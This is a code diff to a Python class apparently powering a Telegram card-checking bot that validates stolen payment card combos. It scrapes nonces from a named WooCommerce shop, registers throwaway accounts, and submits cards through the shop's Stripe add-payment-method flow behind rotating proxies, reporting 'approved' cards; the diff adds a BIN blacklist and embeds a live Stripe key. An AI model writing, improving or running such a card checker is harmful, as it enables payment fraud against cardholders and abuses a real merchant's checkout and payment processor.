@@ -18,16 +18,35 @@ class AdvancedCardChecker:
     def __init__(self):
         self.proxy_pool = []
         self.load_proxies()
-        self.request_timeout = aiohttp.ClientTimeout(total=80)
+        self.request_timeout = aiohttp.ClientTimeout(total=70)
         self.max_concurrent = 3
         self.stripe_key = "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
         self.bin_cache = {}
         self.admin_username = "FNxElectra"
+        # Blacklist setup
+        self.blacklist_file = 'blacklist.txt'
+        self.blacklist = self.load_blacklist()
+        # Add specified BINs to blacklist
+        self.blacklist.update(['559888', '415464'])
+        self.save_blacklist()
 
     def load_proxies(self):
         if os.path.exists('proxies.txt'):
             with open('proxies.txt', 'r') as f:
                 self.proxy_pool = [line.strip() for line in f if line.strip()]
+
+    def load_blacklist(self):
+        """Load blacklisted BINs from file into a set."""
+        if os.path.exists(self.blacklist_file):
+            with open(self.blacklist_file, 'r') as f:
+                return set(line.strip() for line in f if line.strip())
+        return set()  # Return empty set if file doesn’t exist
+
+    def save_blacklist(self):
+        """Save blacklisted BINs to file."""
+        with open(self.blacklist_file, 'w') as f:
+            for bin in sorted(self.blacklist):
+                f.write(bin + '\n')
 
     async def fetch_nonce(self, session, url, pattern, proxy=None):
         try:
@@ -50,7 +69,6 @@ class AdvancedCardChecker:
         try:
             if bin_number in self.bin_cache:
                 return self.bin_cache[bin_number]
-            
             async with aiohttp.ClientSession() as session:
                 async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                     if response.status == 200:
@@ -59,7 +77,7 @@ class AdvancedCardChecker:
                             'scheme': data.get('brand', 'N/A').capitalize(),
                             'type': data.get('type', 'N/A'),
                             'brand': data.get('brand', 'N/A').capitalize(),
-                            'prepaid': 'N/A',  # Not provided by API
+                            'prepaid': 'N/A',
                             'country': data.get('country_name', 'N/A'),
                             'bank': data.get('bank', 'N/A'),
                             'level': data.get('level', 'N/A'),
@@ -97,7 +115,7 @@ class AdvancedCardChecker:
 
 ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
 
-[⌬]𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𝐁𝐘 -» @fn_only_approved
+[⌬]𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𝐁𝐘 -» @{username}
 [⌬]𝐃𝐄𝐕 -» https://t.me/{self.admin_username}
 [み]𝗕𝗼𝘁 -» @FN_CHECKERR_BOT
 """
@@ -106,15 +124,21 @@ class AdvancedCardChecker:
         start_time = datetime.now()
         async with semaphore:
             try:
+                # Validate combo format
                 if len(combo.split("|")) != 4:
                     return None
-
+                # Extract BIN and check blacklist
+                cc = combo.split('|')[0]
+                bin_number = cc[:6]
+                if bin_number in self.blacklist:
+                    logger.info(f"Skipping blacklisted BIN: {bin_number}")
+                    return None
+                # Proceed with checking
                 proxy = random.choice(self.proxy_pool) if self.proxy_pool else None
-                bin_number = combo[:6]
                 bin_info = await self.fetch_bin_info(bin_number)
                 
                 async with aiohttp.ClientSession(timeout=self.request_timeout) as session:
-                    # Nonce fetching
+                    # Fetch nonce for registration
                     nonce = await self.fetch_nonce(session, 
                         'https://www.dragonworksperformance.com/my-account',
                         r'name="woocommerce-register-nonce" value="(.*?)"',
@@ -123,7 +147,7 @@ class AdvancedCardChecker:
                     if not nonce:
                         return None
 
-                    # Account registration
+                    # Register account
                     email = self.generate_random_account()
                     reg_data = {
                         "email": email,
@@ -139,7 +163,7 @@ class AdvancedCardChecker:
                         if response.status != 200:
                             return None
 
-                    # Payment nonce
+                    # Fetch payment nonce
                     payment_nonce = await self.fetch_nonce(session,
                         'https://www.dragonworksperformance.com/my-account/add-payment-method/',
                         r'"createAndConfirmSetupIntentNonce":"(.*?)"',
@@ -148,7 +172,7 @@ class AdvancedCardChecker:
                     if not payment_nonce:
                         return None
 
-                    # Stripe processing
+                    # Process with Stripe
                     card_data = combo.split("|")
                     stripe_data = {
                         "type": "card",
@@ -170,7 +194,7 @@ class AdvancedCardChecker:
                             return None
                         payment_id = stripe_json['id']
 
-                    # Payment confirmation
+                    # Confirm payment
                     confirm_data = {
                         "action": "create_and_confirm_setup_intent",
                         "wc-stripe-payment-method": payment_id,
@@ -197,8 +221,8 @@ class AdvancedCardChecker:
                 return None
 
     async def check_card(self, combo):
-        """Standalone method to check a single card and return formatted result if approved."""
-        user_id = "fn_only_approved"  # Dummy user_id for scrapper checks
+        """Check a single card and return result if approved."""
+        user_id = "scraper"  # Dummy user_id for standalone checks
         semaphore = asyncio.Semaphore(self.max_concurrent)
         result = await self.process_line(user_id, combo, semaphore)
         return result
